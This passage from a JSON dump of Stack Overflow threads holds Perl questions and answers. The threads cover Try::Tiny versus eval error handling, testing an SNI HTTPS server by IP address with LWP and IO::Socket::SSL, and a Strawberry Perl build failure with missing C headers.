"ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485569713, "post_id": 41905660, "comment_id": 70993639, "body": "@ikegami: Yes, the call to MyProgram::Notify::Notification-&gt;new seems to be part of the Glib::Object::Introspection magic. Thanks for the example code, but it seems to be even less readable to me. :-/"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485575769, "post_id": 41905660, "comment_id": 70994563, "body": "&quot;<i>But perlcritic (at level 3) argues about it: Return value of eval not tested at line \u2026</i>&quot; -- why would one have to test the return value? That&#39;s not the  prescribed way to check for exception, nor the only proper one. The critic should&#39;ve also checked whether there is any code between <code>eval</code>&#39;s closing <code>};</code> and <code>if ($@)</code> before complaining. Do you have to go by perlcritic, and by the &quot;harsh&quot; level?"}], "answers": [{"comments": [{"owner": {"reputation": 5181, "user_id": 793172, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/2ec2c4d63fb493164e87d386646c2285?s=128&d=identicon&r=PG", "display_name": "Axel Beckert", "link": "https://stackoverflow.com/users/793172/axel-beckert"}, "edited": false, "score": 0, "creation_date": 1485570182, "post_id": 41905724, "comment_id": 70993685, "body": "Using <code>$@</code> in the <code>finally</code> block comes from <a href=\"https://metacpan.org/pod/Try::Tiny#EXPORTS\" rel=\"nofollow noreferrer\">Try::Tiny&#39;s POD</a>."}, {"owner": {"reputation": 5181, "user_id": 793172, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/2ec2c4d63fb493164e87d386646c2285?s=128&d=identicon&r=PG", "display_name": "Axel Beckert", "link": "https://stackoverflow.com/users/793172/axel-beckert"}, "edited": false, "score": 0, "creation_date": 1485570295, "post_id": 41905724, "comment_id": 70993699, "body": "I already tried the first variant before, too, and it failed for me. Your second example indeed looks like the right solution. I do set <code>$use_notify</code>, but only use it later despite I could have used already immediately."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 5181, "user_id": 793172, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/2ec2c4d63fb493164e87d386646c2285?s=128&d=identicon&r=PG", "display_name": "Axel Beckert", "link": "https://stackoverflow.com/users/793172/axel-beckert"}, "edited": false, "score": 1, "creation_date": 1485570389, "post_id": 41905724, "comment_id": 70993708, "body": "Re &quot;<i>Using <code>$@</code> in the <code>finally</code> block comes from Try::Tiny&#39;s POD</i>&quot;, Read your on link again. It doesn&#39;t say anything remotely similar to that. It actually says &quot;<i><code>$@</code> does <b>not</b> contain the error.</i>&quot;, &quot;<i>Inside the <code>catch</code> block the caught error is stored in <code>$_</code></i>&quot;, and  &quot;<i>note that the <code>finally</code> block does not localize <code>$_</code> with the error</i>&quot;. It also explicitly mentions that <code>$@</code> is not changed at all"}, {"owner": {"reputation": 5181, "user_id": 793172, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/2ec2c4d63fb493164e87d386646c2285?s=128&d=identicon&r=PG", "display_name": "Axel Beckert", "link": "https://stackoverflow.com/users/793172/axel-beckert"}, "edited": false, "score": 0, "creation_date": 1485571270, "post_id": 41905724, "comment_id": 70993822, "body": "Let&#39;s not get stuck on the <code>$@</code>. I really like your first two examples, but neither works for me and also aborts with the <code>Can&#39;t locate object method &quot;new&quot; via package &quot;MyProgram::Notify::Notification&quot;</code> error, too. So my question what&#39;s actually causing the difference still stands. I guess I first need to understand where that object comes from. Just checked with printf-debugging: <code>MyProgram::Notify-&gt;init();</code> in the original code is successfully called, i.e. works there."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 3, "last_activity_date": 1485569643, "creation_date": 1485569643, "answer_id": 41905724, "question_id": 41905660, "link": "https://stackoverflow.com/questions/41905660/why-does-trytinys-try-seem-different-from-eval-for-objects-created/41905724#41905724", "title": "Why does Try::Tiny&#39;s &quot;try {}&quot; seem different from &quot;eval {}&quot; for objects created inside the try block?", "body": "<p>The whole point of the critique is to avoid checking <code>$@</code> because it could have been clobbered. Yet after all your changes, you're still checking <code>$@</code>!</p>\n\n<p>Worse, Try::Tiny puts the error in <code>$_</code>, not in <code>$@</code>, and only in <code>catch</code> blocks.</p>\n\n<p>I think what's happening is that <code>MyProgram::Notify-&gt;init()</code> is being called when it shouldn't because of the above bugs.</p>\n\n<p>Fix:</p>\n\n<pre><code>my $use_notify = 1;\ntry {\n    Glib::Object::Introspection-&gt;setup(\n        basename =&gt; 'Notify',\n        version =&gt; '0.7',\n        package =&gt; \"MyProgram::Notify\",\n    );\n\n    MyProgram::Notify-&gt;init();\n} catch {\n    say \"no notify because setup failed: $_\";\n    $use_notify = 0;\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>my $use_notify = 1;\ntry {\n    Glib::Object::Introspection-&gt;setup(\n        basename =&gt; 'Notify',\n        version =&gt; '0.7',\n        package =&gt; \"MyProgram::Notify\",\n    );\n} catch {\n    say \"no notify because setup failed: $_\";\n    $use_notify = 0;\n}\n\nMyProgram::Notify-&gt;init() if $use_notify;\n</code></pre>\n\n<hr>\n\n<p>Without Try::Tiny:</p>\n\n<pre><code>my $use_notify = 1;\nif (!eval {\n    Glib::Object::Introspection-&gt;setup(\n        basename =&gt; 'Notify',\n        version =&gt; '0.7',\n        package =&gt; \"MyProgram::Notify\",\n    );\n\n    MyProgram::Notify-&gt;init();\n\n    1;  # No exception\n}) {\n    say \"no notify because setup failed: \" . ( $@ // \"Unknown error\" );\n    $use_notify = 0;\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>my $use_notify = 1;\nif (!eval {\n    Glib::Object::Introspection-&gt;setup(\n        basename =&gt; 'Notify',\n        version =&gt; '0.7',\n        package =&gt; \"MyProgram::Notify\",\n    );\n    1;  # No exception\n}) {\n    say \"no notify because setup failed: \" . ( $@ // \"Unknown error\" );\n    $use_notify = 0;\n}\n\nMyProgram::Notify-&gt;init() if $use_notify;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1485587493, "post_id": 41905849, "comment_id": 70996385, "body": "That would have been easier to pinpoint had you included more code. Because the closing curly looked like the last line of the program it shouldn&#39;t have mattered."}], "tags": [], "owner": {"reputation": 5181, "user_id": 793172, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/2ec2c4d63fb493164e87d386646c2285?s=128&d=identicon&r=PG", "display_name": "Axel Beckert", "link": "https://stackoverflow.com/users/793172/axel-beckert"}, "is_accepted": false, "score": 0, "last_activity_date": 1485571564, "last_edit_date": 1495540891, "creation_date": 1485571564, "answer_id": 41905849, "question_id": 41905660, "link": "https://stackoverflow.com/questions/41905660/why-does-trytinys-try-seem-different-from-eval-for-objects-created/41905849#41905849", "title": "Why does Try::Tiny&#39;s &quot;try {}&quot; seem different from &quot;eval {}&quot; for objects created inside the try block?", "body": "<p>Actually the answer to my question is basically the same as <a href=\"https://stackoverflow.com/a/2871742/793172\">this one</a>: A missing semicolon behind the <code>catch</code> (or rather <code>finally</code>) block.</p>\n\n<p>Sorry for the noise.</p>\n"}], "owner": {"reputation": 5181, "user_id": 793172, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/2ec2c4d63fb493164e87d386646c2285?s=128&d=identicon&r=PG", "display_name": "Axel Beckert", "link": "https://stackoverflow.com/users/793172/axel-beckert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 171, "favorite_count": 1, "answer_count": 2, "score": -1, "last_activity_date": 1485577664, "creation_date": 1485568879, "last_edit_date": 1485577664, "question_id": 41905660, "link": "https://stackoverflow.com/questions/41905660/why-does-trytinys-try-seem-different-from-eval-for-objects-created", "title": "Why does Try::Tiny&#39;s &quot;try {}&quot; seem different from &quot;eval {}&quot; for objects created inside the try block?", "body": "<p>I have the following initialisation code in a system tray applet:</p>\n\n<pre><code>use Gtk3 -init;\nuse Glib::Object::Introspection;\n\neval {\n    Glib::Object::Introspection-&gt;setup(\n        basename =&gt; 'Notify',\n        version =&gt; '0.7',\n        package =&gt; \"MyProgram::Notify\",\n        );\n};\n\nif ($@) {\n    say \"no notify because setup failed: $@\";\n    $use_notify = 0;\n} else {\n    MyProgram::Notify-&gt;init();\n}\n</code></pre>\n\n<p>That code is based upon <a href=\"https://anonscm.debian.org/git/users/wouter/fdpowermon.git/tree/fdpowermon\" rel=\"nofollow noreferrer\">fdpowermon</a>, but seems to come more or less from the <a href=\"https://metacpan.org/pod/Glib::Object::Introspection#Exception-handling\" rel=\"nofollow noreferrer\">Exception handling examples in the POD of Glib::Object::Introspection</a>.</p>\n\n<p>But perlcritic (at level 3) argues about it:</p>\n\n<pre><code>Return value of eval not tested at line \u2026\n</code></pre>\n\n<p>So I tried to rewrite that with Try::Tiny:</p>\n\n<pre><code>use Gtk3 -init;\nuse Glib::Object::Introspection;\nuse Try::Tiny;\n\ntry {\n    Glib::Object::Introspection-&gt;setup(\n        basename =&gt; 'Notify',\n        version =&gt; '0.7',\n        package =&gt; \"MyProgram::Notify\",\n        );\n} catch {\n    say \"no notify because setup failed: $@\";\n    $use_notify = 0;\n} finally {\n    if (!$@) {\n        MyProgram::Notify-&gt;init();\n    }\n}\n</code></pre>\n\n<p>But then perl argues:</p>\n\n<pre><code>Can't locate object method \"new\" via package MyProgram::Notify::Notification\n</code></pre>\n\n<p>While I do see that especially the <code>finally</code> block is not a real improvement, I do not understand why using Try::Tiny makes such a difference with regards to the package created by Glib::Object::Introspection.</p>\n\n<p>Or is there a better way than Try::Tiny to make this code more elegant and more readable while keeping <code>perlcritic</code> happy?</p>\n"}, {"tags": ["perl", "ssl", "lwp-useragent"], "answers": [{"comments": [{"owner": {"reputation": 149, "user_id": 1222307, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e4593780df11bb64273008c2f8925227?s=128&d=identicon&r=PG", "display_name": "abatie", "link": "https://stackoverflow.com/users/1222307/abatie"}, "edited": false, "score": 0, "creation_date": 1485817546, "post_id": 41907091, "comment_id": 71074389, "body": "That gets the same error, and tshark shows SNI being set properly, so I think the problem is actually a server interaction issue.  I&#39;m pursuing that with the remote site now..."}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": false, "score": 2, "last_activity_date": 1485585554, "creation_date": 1485585554, "answer_id": 41907091, "question_id": 41905483, "link": "https://stackoverflow.com/questions/41905483/testing-an-sni-https-service-by-ip-address/41907091#41907091", "title": "Testing an SNI https service by ip address", "body": "<p>You might skip LWP and use the socket directly:</p>\n\n<pre><code>use IO::Socket::SSL;\n\nmy $ip_address = ...;\nmy $server_name = ...;\n\nmy $cl = IO::Socket::SSL-&gt;new(\n    PeerAddr =&gt; $ip_address,\n    PeerPort =&gt; 443,\n    SSL_hostname =&gt; $server_name,\n    SSL_verifycn_name =&gt; $server_name,\n    SSL_verifycn_scheme =&gt; 'http',\n);\nprint $cl \"GET / HTTP/1.0\\r\\nHost: $server_name\\r\\n\\r\\n\";\nprint scalar(&lt;$cl&gt;);  # status line\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1485833883, "post_id": 41947347, "comment_id": 71078406, "body": "Your  question asked about how to test a specific IP address with SNI. Your answer does not answer the question but instead shows the solution to the underlying problem, i.e. why you needed this test at all. Thus it would be a fit for a comment, but not for an answer."}], "tags": [], "owner": {"reputation": 149, "user_id": 1222307, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e4593780df11bb64273008c2f8925227?s=128&d=identicon&r=PG", "display_name": "abatie", "link": "https://stackoverflow.com/users/1222307/abatie"}, "is_accepted": false, "score": -1, "last_activity_date": 1485819624, "creation_date": 1485819624, "answer_id": 41947347, "question_id": 41905483, "link": "https://stackoverflow.com/questions/41905483/testing-an-sni-https-service-by-ip-address/41947347#41947347", "title": "Testing an SNI https service by ip address", "body": "<p>The problem turned out to be a proxy in the middle that was translating to an IP address url form.  Corrected to properly use the name and it started working.</p>\n"}], "owner": {"reputation": 149, "user_id": 1222307, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e4593780df11bb64273008c2f8925227?s=128&d=identicon&r=PG", "display_name": "abatie", "link": "https://stackoverflow.com/users/1222307/abatie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 625, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1485819624, "creation_date": 1485566524, "question_id": 41905483, "link": "https://stackoverflow.com/questions/41905483/testing-an-sni-https-service-by-ip-address", "title": "Testing an SNI https service by ip address", "body": "<p>I am writing a perl script to test out a server before switching DNS from the old server (for supporting server migrations).  I'd rather not hack /etc/hosts to override DNS for testing, and instead have the script munge things to work.</p>\n\n<p>It's easy enough for non-ssl connections, but I'm having trouble with SSL - it works for most sites because most still bind a site to an ip address, but one particular customer's site is too smart for its own good (and that's the direction things should be heading anyhow), and I need to tell LWP::UserAgent to connect to an IP address but use a servername in the request (both SSL SNI and HTTP Host:).</p>\n\n<p>I'm using ssl_opts to set the SNI hostname (and the SSLeay trace shows that's getting set right), and forcing the Host HTTP header to the servername (which printing out the request shows is supposed to be getting set right), but LWP uses the url to decide what host to connect to and that url is getting in where it shouldn't somewhere (I would expect the actual \"GET\" to be simply \"GET /\", so the request \"as_string\" isn't completely accurate here), resulting in an error:</p>\n\n<pre><code>#!/usr/bin/perl\n\n#\n#  ht\n#\n#  https test\n#  see if I can force a Host: header\n#  while using an ip address to connect\n#\n\nuse strict;\n\nuse Net::SSLeay;\nuse LWP::UserAgent;\n$Net::SSLeay::trace = 2;\n\nmy $ip = '1.2.3.4';\nmy $server_name = 'server.name';\nmy $url = \"https://$ip/\";\n#my $url = \"https://$server_name/\";\n\nprint \"connecting to $ip for $server_name\\n\";\n\nmy $h = HTTP::Headers-&gt;new;\n$h-&gt;header('Host' =&gt; $server_name);\n\nmy %options = (\n    'ssl_opts' =&gt; { SSL_hostname =&gt; $server_name }\n);\n\nmy $ua = LWP::UserAgent-&gt;new(%options);\n$ua-&gt;agent(\"perl-mpchk/0.1 \");\n\n# Create a request\nmy $req;\n$req = HTTP::Request-&gt;new('GET', $url, $h);\nprint $req-&gt;as_string, \"\\n\";\n\n# Send request to the user agent and get a response back\nmy $res = $ua-&gt;request($req);\nif (!defined($res)) {\n    die \"connect to $url failed\\n\";\n}\n\nprint $res-&gt;status_line, \"\\n\";\n\nexit 0;\n</code></pre>\n\n<p>with a hostname:</p>\n\n<pre><code>connecting to 1.2.3.4 for server.name\nGET https://server.name/\nHost: server.name\n\nDEBUG: .../IO/Socket/SSL.pm:562: socket not yet connected\nDEBUG: .../IO/Socket/SSL.pm:564: socket connected\nDEBUG: .../IO/Socket/SSL.pm:586: ssl handshake not started\nDEBUG: .../IO/Socket/SSL.pm:619: using SNI with hostname server.name\nDEBUG: .../IO/Socket/SSL.pm:654: request OCSP stapling\nDEBUG: .../IO/Socket/SSL.pm:673: set socket to non-blocking to enforce timeout=180\nDEBUG: .../IO/Socket/SSL.pm:699: ssl handshake in progress\nDEBUG: .../IO/Socket/SSL.pm:709: waiting for fd to become ready: SSL wants a read first\nDEBUG: .../IO/Socket/SSL.pm:729: socket ready, retrying connect\nDEBUG: .../IO/Socket/SSL.pm:744: ssl handshake done\n200 OK\n</code></pre>\n\n<p>with an ip address</p>\n\n<pre><code>connecting to 1.2.3.4 for server.name\nGET https://1.2.3.4/\nHost: server.name\n\nDEBUG: .../IO/Socket/SSL.pm:562: socket not yet connected\nDEBUG: .../IO/Socket/SSL.pm:564: socket connected\nDEBUG: .../IO/Socket/SSL.pm:586: ssl handshake not started\nDEBUG: .../IO/Socket/SSL.pm:619: using SNI with hostname server.name\nDEBUG: .../IO/Socket/SSL.pm:654: request OCSP stapling\nDEBUG: .../IO/Socket/SSL.pm:673: set socket to non-blocking to enforce timeout=180\nDEBUG: .../IO/Socket/SSL.pm:699: ssl handshake in progress\nDEBUG: .../IO/Socket/SSL.pm:709: waiting for fd to become ready: SSL wants a read first\nDEBUG: .../IO/Socket/SSL.pm:729: socket ready, retrying connect\nDEBUG: .../IO/Socket/SSL.pm:744: ssl handshake done\n500 Unknown Domain\n</code></pre>\n"}, {"tags": ["windows", "perl", "mason"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 4, "creation_date": 1485558653, "post_id": 41904416, "comment_id": 70991453, "body": "Looks similar to <a href=\"http://www.nntp.perl.org/group/perl.win32.vanilla/2011/06/msg312.html\" rel=\"nofollow noreferrer\">this issue</a>. gcc isn&#39;t finding any of the standard header files."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 2, "creation_date": 1485559679, "post_id": 41904416, "comment_id": 70991746, "body": "<a href=\"https://stackoverflow.com/questions/304319/is-there-an-equivalent-of-which-on-the-windows-command-line#304447\">Check to see if you have another <code>gcc</code> installed</a> and if Strawberry is using that."}, {"owner": {"reputation": 104, "user_id": 4145475, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-rtV4UNDouzs/AAAAAAAAAAI/AAAAAAAAAAA/r9y2hsxcgaM/photo.jpg?sz=128", "display_name": "draxtor", "link": "https://stackoverflow.com/users/4145475/draxtor"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485599521, "post_id": 41904416, "comment_id": 70999051, "body": "Thanks guys. I followed @ThisSuitIsBlackNot advice and it was the same issue. I had Free pascal installed and it was in path prior to strawberry. I assume Free pascal is using gcc too."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485617176, "post_id": 41904416, "comment_id": 71004072, "body": "Great! Feel free to write up your own answer and accept it."}], "answers": [{"tags": [], "owner": {"reputation": 104, "user_id": 4145475, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-rtV4UNDouzs/AAAAAAAAAAI/AAAAAAAAAAA/r9y2hsxcgaM/photo.jpg?sz=128", "display_name": "draxtor", "link": "https://stackoverflow.com/users/4145475/draxtor"}, "is_accepted": true, "score": 0, "last_activity_date": 1485685311, "creation_date": 1485685311, "answer_id": 41919810, "question_id": 41904416, "link": "https://stackoverflow.com/questions/41904416/strawberry-perl-cannot-install-mason-templates/41919810#41919810", "title": "Strawberry Perl cannot install Mason templates", "body": "<p>I've just changed the path order for Strawberry in Edit environment variable. As noted in this <a href=\"http://www.nntp.perl.org/group/perl.win32.vanilla/2011/06/msg315.html\" rel=\"nofollow noreferrer\">thread</a>\n<a href=\"https://i.stack.imgur.com/W9CuS.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/W9CuS.png\" alt=\"Screenshot from path\"></a></p>\n"}], "owner": {"reputation": 104, "user_id": 4145475, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-rtV4UNDouzs/AAAAAAAAAAI/AAAAAAAAAAA/r9y2hsxcgaM/photo.jpg?sz=128", "display_name": "draxtor", "link": "https://stackoverflow.com/users/4145475/draxtor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 177, "favorite_count": 0, "accepted_answer_id": 41919810, "answer_count": 1, "score": 0, "last_activity_date": 1485685311, "creation_date": 1485558112, "question_id": 41904416, "link": "https://stackoverflow.com/questions/41904416/strawberry-perl-cannot-install-mason-templates", "title": "Strawberry Perl cannot install Mason templates", "body": "<p>Hi cannot install mason templates on Strawberry Perl on windows 10 x64.\nI've installed strawberry-perl-5.24.1.1-64bit.msi\nCPAN works normally.</p>\n\n<p>Any help would be great.</p>\n\n<p>Guard installation fails:</p>\n\n<pre><code>C:\\Strawberry\\Echo&gt;cpanm Mason\n--&gt; Working on Mason\nFetching http://www.cpan.org/authors/id/J/JS/JSWARTZ/Mason-2.24.tar.gz ... OK\nConfiguring Mason-2.24 ... OK\n==&gt; Found dependencies: Guard\n--&gt; Working on Guard\nFetching http://www.cpan.org/authors/id/M/ML/MLEHMANN/Guard-1.023.tar.gz ... OK\nConfiguring Guard-1.023 ... OK\nBuilding and testing Guard-1.023 ... FAIL\n! Installing Guard failed. See C:\\Users\\DRASKO~1.POP\\.cpanm\\work\\1485557949.7836\\build.log for details. Retry with --force to force install it.\n! Installing the dependencies failed: Module 'Guard' is not installed\n! Bailing out the installation for Mason-2.24.\n\nC:\\Strawberry\\Echo&gt;cpanm  --verbose Guard\ncpanm (App::cpanminus) 1.7042 on perl 5.024001 built for MSWin32-x64-multi-thread\nWork directory is C:\\Users\\DRASKO~1.POP/.cpanm/work/1485557107.8988\nYou have make C:\\Strawberry\\c\\bin\\dmake.exe\nYou have LWP 6.15\nFalling back to Archive::Tar 2.24\nYou have C:\\FPC\\3.0.0\\bin\\i386-Win32\\unzip.exe\nSearching Guard () on cpanmetadb ...\n--&gt; Working on Guard\nFetching http://www.cpan.org/authors/id/M/ML/MLEHMANN/Guard-1.023.tar.gz ... OK\nUnpacking Guard-1.023.tar.gz\nEntering Guard-1.023\nChecking configure dependencies from META.json\nChecking if you have ExtUtils::MakeMaker 6.58 ... Yes (7.24)\nRunning Makefile.PL\nConfiguring Guard-1.023 ... Checking if your kit is complete...\nLooks good\nGenerating a dmake-style Makefile\nWriting Makefile for Guard\nWriting MYMETA.yml and MYMETA.json\nOK\nChecking dependencies from MYMETA.json ...\nChecking if you have ExtUtils::MakeMaker 0 ... Yes (7.24)\nBuilding and testing Guard-1.023 ... cp Guard.pm blib\\lib\\Guard.pm\nRunning Mkbootstrap for Guard ()\n\"C:\\Strawberry\\perl\\bin\\perl.exe\" -MExtUtils::Command -e chmod -- 644 \"Guard.bs\"\n\"C:\\Strawberry\\perl\\bin\\perl.exe\" -MExtUtils::Command::MM -e cp_nonempty -- Guard.bs blib\\arch\\auto\\Guard\\Guard.bs 644\n\"C:\\Strawberry\\perl\\bin\\perl.exe\" \"C:\\Strawberry\\perl\\lib\\ExtUtils\\xsubpp\"  -typemap C:\\STRAWB~1\\perl\\lib\\ExtUtils\\typemap  Guard.xs &gt; Guard.xsc\n\"C:\\Strawberry\\perl\\bin\\perl.exe\" -MExtUtils::Command -e mv -- Guard.xsc Guard.c\ngcc -c          -s -O2 -DWIN32 -DWIN64 -DCONSERVATIVE -DPERL_TEXTMODE_SCRIPTS -DPERL_IMPLICIT_CONTEXT -DPERL_IMPLICIT_SYS -fwrapv -fno-strict-aliasing -mms-bitfields -s -O2      -DVERSION=\\\"1.023\\\"   -DXS_VERSION=\\\"1.023\\\"  \"-IC:\\STRAWB~1\\perl\\lib\\CORE\"   Guard.c\nIn file included from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:689: sys\\types.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:707: stdarg.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:718: ctype.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:729: locale.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:764: setjmp.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:785: stdlib.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:923: stddef.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:936: string.h: No such file or directory\nIn file included from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:1084: sys\\stat.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:1113: time.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:1134: errno.h: No such file or directory\nIn file included from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:1789: limits.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:1792: float.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:1811: limits.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:1814: float.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:1843: limits.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:2434: limits.h: No such file or directory\nIn file included from C:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:2684,\n                 from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\handy.h:77: stdbool.h: No such file or directory\nIn file included from C:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:2795,\n                 from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\dosish.h:110: signal.h: No such file or directory\nIn file included from C:\\STRAWB~1\\perl\\lib\\CORE\\win32thread.h:4,\n                 from C:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:3159,\n                 from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:131: windows.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:159: io.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:160: process.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:161: stdio.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:162: direct.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:163: stdlib.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:164: stddef.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:165: fcntl.h: No such file or directory\nIn file included from C:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:426,\n                 from C:\\STRAWB~1\\perl\\lib\\CORE\\win32thread.h:4,\n                 from C:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:3159,\n                 from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\sys\\socket.h:13: windows.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\sys\\socket.h:21: winsock2.h: No such file or directory\nC:\\STRAWB~1\\perl\\lib\\CORE\\sys\\socket.h:30: ws2tcpip.h: No such file or directory\nIn file included from C:\\STRAWB~1\\perl\\lib\\CORE\\sys\\socket.h:184,\n                 from C:\\STRAWB~1\\perl\\lib\\CORE\\win32.h:426,\n                 from C:\\STRAWB~1\\perl\\lib\\CORE\\win32thread.h:4,\n                 from C:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:3159,\n                 from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\sys\\errno2.h:10: winsock2.h: No such file or directory\nIn file included from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:3648: assert.h: No such file or directory\nIn file included from C:\\STRAWB~1\\perl\\lib\\CORE\\iperlsys.h:51,\n                 from C:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:3856,\n                 from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\perlio.h:41: stdio.h: No such file or directory\nIn file included from C:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:3856,\n                 from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\iperlsys.h:920: setjmp.h: No such file or directory\nIn file included from Guard.xs:4:\nC:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:4449: math.h: No such file or directory\nIn file included from C:\\STRAWB~1\\perl\\lib\\CORE\\perl.h:5576,\n                 from 